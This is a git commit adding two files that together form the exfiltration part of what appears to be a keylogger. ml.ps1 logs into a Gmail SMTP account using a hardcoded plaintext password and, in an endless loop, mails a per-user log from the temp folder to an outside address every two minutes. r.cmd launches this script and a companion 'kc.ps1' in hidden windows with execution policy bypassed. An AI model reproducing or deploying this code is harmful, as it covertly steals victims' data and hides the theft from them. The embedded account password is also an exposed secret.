d004b8621ac0a6f5e006fb959db970f254f0d368
gabrielg13rojas <gabrielg13rojas@gmail.com>
2023-05-05 09:59:34 -0400

    Add files via upload

---
+++ ml.ps1
@@ -0,0 +1,9 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('01100111.m3rc3h4ck@gmail.com', 'jjjcbfzmpbxyqaeo')
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = '01100111.m3rc3h4ck@gmail.com'
+$ReportEmail.To.Add('gabrielg13rojas@gmail.com')
+$ReportEmail.Subject = 'DATOS DE ' +$env:UserName+' EN PC: '+ [System.Net.Dns]::GetHostByName(($env:computerName)).HostName + ' RECIBIDOS'
+while(1){$ReportEmail.Attachments.Add("$env:temp/$env:UserName.log");$SMTPInfo.Send($ReportEmail);sleep 120} 
---
+++ r.cmd
@@ -0,0 +1,2 @@
+cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%/kc.ps1"
+cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%/ml.ps1"
